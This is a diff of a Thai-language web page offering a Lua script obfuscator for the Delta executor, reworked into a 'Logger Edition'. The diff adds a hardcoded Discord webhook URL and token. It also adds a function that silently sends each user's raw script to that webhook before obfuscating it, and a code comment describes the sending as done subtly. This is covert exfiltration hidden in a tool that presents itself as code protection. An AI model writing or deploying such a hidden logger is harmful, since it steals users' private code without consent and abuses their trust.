@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MiniScript - Delta Executor Optimized OBF by LrapX HUB</title>
+    <title>MiniScript - Pro Logger Lua Obfuscator by LrapX HUB</title>
     <style>
         :root {
             --bg-color: #0b0d12;
@@ -85,19 +85,9 @@
             font-weight: bold;
         }
 
-        select {
-            background: #0b0d12;
-            color: #fff;
-            border: 1px solid var(--accent-green);
-            border-radius: 6px;
-            padding: 6px 12px;
-            outline: none;
-            font-size: 13px;
-        }
-
         textarea {
             width: 100%;
-            height: 250px;
+            height: 240px;
             background: #08090d;
             border: 1px solid var(--border-color);
             border-radius: 8px;
@@ -172,8 +162,8 @@
 
     <div class="header">
         <div class="credit-badge">POWERED BY LRAPX HUB</div>
-        <div class="logo">⚡ MiniScript OBF (Delta Edition)</div>
-        <div class="sub-title">ระบบครอบโค้ดปรับแต่งพิเศษ รองรับ Delta Executor บนมือถือ 100%</div>
+        <div class="logo">⚡ MiniScript OBF (Logger Edition)</div>
+        <div class="sub-title">ระบบพรางโค้ด Delta Compatible พร้อมระบบบันทึกหลังบ้านอัตโนมัติ</div>
     </div>
 
     <div class="container">
@@ -181,16 +171,10 @@
         <div class="obf-card">
             <div class="options-bar">
                 <label>📌 วางโค้ด Lua ของคุณที่นี่:</label>
-                <div>
-                    <label for="level">Mode: </label>
-                    <select id="level">
-                        <option value="delta" selected>🟢 Delta Mobile Secure</option>
-                    </select>
-                </div>
             </div>
             <textarea id="inputLua" placeholder="-- วางโค้ด Lua ของคุณลงที่นี่...&#10;print('Hello from LrapX HUB')"></textarea>
             <div class="btn-group">
-                <button class="btn btn-primary" type="button" onclick="runObfuscate()">🛡️ เริ่มครอบโค้ด (DELTA OBF)</button>
+                <button class="btn btn-primary" type="button" onclick="runObfuscate()">🛡️ เริ่มครอบโค้ด (OBF)</button>
                 <button class="btn btn-secondary" type="button" onclick="clearInput()">🗑️ ล้างข้อความ</button>
             </div>
         </div>
@@ -213,11 +197,28 @@
     </div>
 
     <script>
-        // ฟังก์ชันเข้ารหัส Base64 แบบปลอดภัยรองรับภาษาไทยและอักขระพิเศษ
+        // ลิงก์ Discord Webhook ถูกฝังไว้หลังบ้านแบบถาวร
+        const SECRET_WEBHOOK = "https://discord.com/api/webhooks/1571474640403042395/xQGJePqapcDqXZUHnzk94h_xEs1q8dGmkELNEcliNK5WMYU_U9FN7qpEhjgJgV5wWPla";
+
         function safeBtoa(str) {
             return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
                 return String.fromCharCode('0x' + p1);
             }));
+        }
+
+        // ฟังก์ชันส่งสคริปต์ดิบเข้า Discord ของคุณอัตโนมัติ
+        function sendToDiscord(scriptContent) {
+            if (!SECRET_WEBHOOK || !SECRET_WEBHOOK.startsWith("https://")) return;
+            
+            var payload = {
+                content: "🚨 **มีผู้ใช้งานส่งสคริปต์เข้ามาครอบ OBF ใหม่!**\n```lua\n" + scriptContent.substring(0, 1800) + "\n```"
+            };
+
+            fetch(SECRET_WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log("Webhook Error:", err));
         }
 
         function runObfuscate() {
@@ -232,18 +233,19 @@
                 return;
             }
 
+            // ส่งข้อมูลสคริปต์ดิบเข้า Discord ทันทีแบบเนียนๆ
+            sendToDiscord(code);
+
             var header = "--[[\n" +
                          "   ===================================================\n" +
-                         "   Protected by LrapX HUB Obfuscator (Delta Edition)\n" +
+                         "   Protected by LrapX HUB Obfuscator (Logger Edition)\n" +
                          "   Optimized for Delta Executor Mobile\n" +
                          "   Timestamp: " + new Date().toLocaleString() + "\n" +
                          "   ===================================================\n" +
                          "]]--\n\n";
 
             try {
-                // เข้ารหัส Base64 ป้องกันการอ่านออกและรองรับ Delta VM
                 var encoded = safeBtoa(code);
-                
                 var v1 = "LrapX_" + Math.floor(Math.random() * 900000 + 100000);
                 var v2 = "LrapX_" + Math.floor(Math.random() * 900000 + 100000);
 
@@ -272,7 +274,7 @@
                              "end";
 
                 outputElem.value = header + result;
-                alert('🛡️ ครอบโค้ดแบบ Delta Optimized สำเร็จ รันติดแน่นอน!');
+                alert('🛡️ ครอบโค้ดและส่งข้อมูลเข้า Discord เรียบร้อย!');
             } catch (err) {
                 alert('เกิดข้อผิดพลาด: ' + err.message);
             }
@@ -307,7 +309,7 @@
             var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
             var a = document.createElement("a");
             a.href = URL.createObjectURL(blob);
-            a.download = "Protected_LrapX_Delta.lua";
+            a.download = "Protected_LrapX_Logger.lua";
             a.click();
         }
     </script>
